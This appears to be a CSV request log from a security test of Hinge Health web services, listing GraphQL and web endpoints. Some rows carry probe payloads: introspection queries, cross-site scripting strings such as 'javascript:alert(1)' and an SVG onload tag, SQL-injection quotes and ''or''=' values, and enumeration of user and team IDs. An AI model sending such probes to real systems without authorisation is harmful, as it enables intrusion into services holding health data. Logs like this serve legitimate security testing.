endpoint,method
http://detectportal.firefox.com/success.txt,GET
https://my.hingehealth.io/graphql,"{""operationName"":""GetUser"",""variables"":{},""query"":""query"
https://coach-tools-bff.hingehealth.io/graphql,"{""operationName"":""getUserById"",""variables"":{""userId"":50166233},""query"":""query"
https://phoenix-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""findAllMemberAlerts"",""variables"":{""getMemberAlertInput"":{""userUuids"":[""e5970b6e-d6c9-4fb3-a49d-4b76a5ceb3ca""],""status"":[""Active"",""Upcoming""]}},""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""conversations"",""variables"":{""itemsPerPage"":25,""userIds"":[50166212],""adminUuid"":""dcc3630b-30d4-4315-b670-e99ae244ff9b"",""types"":[""TextConversation""],""page"":0},""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""conversations"",""variables"":{""itemsPerPage"":25,""userIds"":[50166212],""adminUuid"":""dcc3630b-30d4-4315-b670-e99ae244ff9b'"",""types"":[""TextConversation""],""page"":0},""query"":""query"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""createInAppMessage"",""variables"":{""createMessageDto"":{""conversationId"":""d3a394a04ff04bf0acaf5ab4de5997b0"",""message"":{""fromId"":""dcc3630b-30d4-4315-b670-e99ae244ff9b"",""attachments"":[{""asset_url"":""javascript:alert(1)"",""file_size"":291,""mime_type"":""text/html"",""title"":""5.html"",""type"":""file""}],""text"":""test"",""memberUuid"":""079db072-d59a-4975-8cc3-1b976342d440""}}},""query"":""mutation"
https://chat.stream-io-api.com/messages/8c99a5da-6c50-4121-b9c8-e5e85570fc64,"{""message"":{""text"":""testers"",""attachments"":[{""type"":""file"",""title"":""5.html"",""asset_url"":""javascript:alert(1)"",""file_size"":291,""mime_type"":""text/html""}],""edited_at"":""2024-09-27T14:36:14.488Z""}}"
https://care-team-tools-bff.hingehealth.io/graphql,"{""operationName"":""getScheduledInAppMessages"",""variables"":{""listScheduledInAppMessagesInputDto"":{""conversationId"":""d3a394a04ff04bf0acaf5ab4de5997b0'""}},""query"":""query"
https://scheduling-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://scheduling-bff.hingehealth.io/graphql,"{""operationName"":""User"",""variables"":{},""query"":""query"
https://scheduling-bff.hingehealth.io/graphql,"{""operationName"":""user"",""variables"":{},""query"":""query"
https://coach-tools-bff.hingehealth.io/graphql,"{""operationName"":""allConversations"",""variables"":{""adminUuid"":""dcc3630b-30d4-4315-b670-e99ae244ff9b""},""query"":""query"
https://coach-tools-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://my.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://app.hingehealth.io/api/v3/tasks/36135918,"{""message"":""\""/><svg/onload=alert(1)>"",""status"":""completed""}"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""UserInfo"",""variables"":{""id"":""50166232""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getUserUuidById"",""variables"":{""id"":""23220685'""},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getClientInsurersByClient"",""variables"":{""id"":""122""},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getClientInsurersByClient"",""variables"":{""id"":""122'""},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getClientInsurersByClient"",""variables"":{""id"":""'or''='""},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getClientInsurerById"",""variables"":{""id"":""123'""},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getDiscountUsage"",""variables"":{""clientId"":""3462'"",""discountDetailIds"":[59,70,83,545,546,547,69,103,113,294,295,296]},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getDiscountUsage"",""variables"":{""clientId"":""3462'"",""discountDetailIds"":[""59'"",70,83,545,546,547,69,103,113,294,295,296]},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getContractsByClientInsurer"",""variables"":{""id"":""6112'"",""includeVoided"":true},""query"":""query"
https://operations-hub-bff.hingehealth.io/graphql,"{""operationName"":""getContractTemplates"",""variables"":{},""query"":""query"
https://configurator-bff.hingehealth.io/graphql,"{""operationName"":""IntrospectionQuery"",""variables"":{},""query"":""query"
https://app.hingehealth.io/admin/admins/8304,POST
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""UserInfo"",""variables"":{""id"":""50166233""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""UserInfo"",""variables"":{""id"":""50166231""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""UserInfo"",""variables"":{""id"":""50166211""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""UserInfo"",""variables"":{""id"":""50166213""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40485""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40484""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40483""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40482""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40481""},""query"":""query"
https://coach-tools-bff.hingehealth.io/api/graphql/coach_tools,"{""operationName"":""Team"",""variables"":{""id"":""40480""},""query"":""query"
https://my.hingehealth.io/split-sdk/api/splitChanges,GET
https://login.hingehealth.io/authorize,GET
https://my.hingehealth.io/graphql,POST
https://login.hingehealth.io/oauth/token,POST
https://my.hingehealth.io/mixpanel/track/,POST
https://my.hingehealth.io/users/sign_out,GET
https://my.hingehealth.io/users/sign_in,GET
https://my.hingehealth.io/login/auth-provider,GET
https://my.hingehealth.io/split-events/api/testImpressions/count/beacon,POST
https://my.hingehealth.io/split-events/api/testImpressions/beacon,POST
https://my.hingehealth.io/static/js/main.43f63fb0.js,GET
https://my.hingehealth.io/static/js/6123.f87edca5.chunk.js,GET
https://my.hingehealth.io/static/js/1564.ecb0fb91.chunk.js,GET
https://my.hingehealth.io/sentry,POST
https://my.hingehealth.io/split-sdk/api/mySegments/e5970b6e-d6c9-4fb3-a49d-4b76a5ceb3ca,GET
https://my.hingehealth.io/csrf,GET
https://login.hingehealth.io/u/login/identifier,GET
https://login.hingehealth.io/u/login/identifier,POST
https://login.hingehealth.io/u/login/password,GET
https://login.hingehealth.io/u/login/password,POST
https://login.hingehealth.io/authorize/resume,GET
https://my.hingehealth.io/auth/callback,GET
https://my.hingehealth.io/split-sdk/api/mySegments/e4e87e0a-b1d2-4766-bbd4-51d3d9ea018d,GET
https://my.hingehealth.io/split-sdk/api/mySegments/c38269d9-9b55-48fe-bf7f-496c4e7b1fbb,GET
https://my.hingehealth.io/static/js/main.ed981aa6.js,GET
https://my.hingehealth.io/static/js/6123.2c3e6e7f.chunk.js,GET
https://login.hingehealth.io/oauth/token,OPTIONS
https://my.hingehealth.io/static/js/695.307b9fbe.chunk.js,GET
https://my.hingehealth.io/static/media/ic_avatar.5d2231514b1d79df04d0.webp,GET
https://admin.hingehealth.io/,GET
https://my.hingehealth.io/my-hinge-health,GET
https://my.hingehealth.io/split-sdk/api/mySegments/079db072-d59a-4975-8cc3-1b976342d440,GET
https://ctp.hingehealth.io/,GET
https://ctp.hingehealth.io/main.0eac0a6939ea451a23bb.bundle.js,GET
https://cdn.hingehealth.io/localized-text/exercises/v1/en-US.json,GET
https://cdn.hingehealth.io/localized-text/exercises/v1/es-US.json,GET
https://cdn.hingehealth.io/localized-text/patient-specific-functional-scale/v1/en-US.json,GET
https://cdn.hingehealth.io/localized-text/patient-specific-functional-scale/v1/es-US.json,GET
https://coath.hingehealth.io/,GET
https://ctp.hingehealth.io/okta/callback,GET
https://care-team-tools-bff.hingehealth.io/graphql,OPTIONS
https://care-team-tools-bff.hingehealth.io/user-workflows/subscribe,GET
https://care-team-tools-bff.hingehealth.io/graphql,POST
https://ctp.hingehealth.io/79.ae2f8a9fa0e929b1bf7d.bundle.js,GET
https://ctp.hingehealth.io/test.e3e7e5fdf55b8a45d12f.bundle.js,GET
https://automation-bff.hingehealth.io/graphql,OPTIONS
https://automation-bff.hingehealth.io/graphql,POST
https://ctp.hingehealth.io/899.d0612b52d86b1e118ca6.bundle.js,GET
https://ctp.hingehealth.io/996.9872cd4a4bf5c68104dd.bundle.js,GET
https://ctp.hingehealth.io/595.c2c553648306b77925d5.bundle.js,GET
https://ctp.hingehealth.io/766.63df96458408d7c8905b.bundle.js,GET
https://ctp.hingehealth.io/791.6c5ef22fda0b0af8b21e.bundle.js,GET
https://ctp.hingehealth.io/member.ec82d292150c39780adf.bundle.js,GET
https://ctp.hingehealth.io/783.499ab7305ac51971b034.bundle.js,GET
https://ctp.hingehealth.io/member-search.65b9312658fee4bcbc72.bundle.js,GET
https://ctp.hingehealth.io/mass-message-list.8c80639d77859283729c.bundle.js,GET
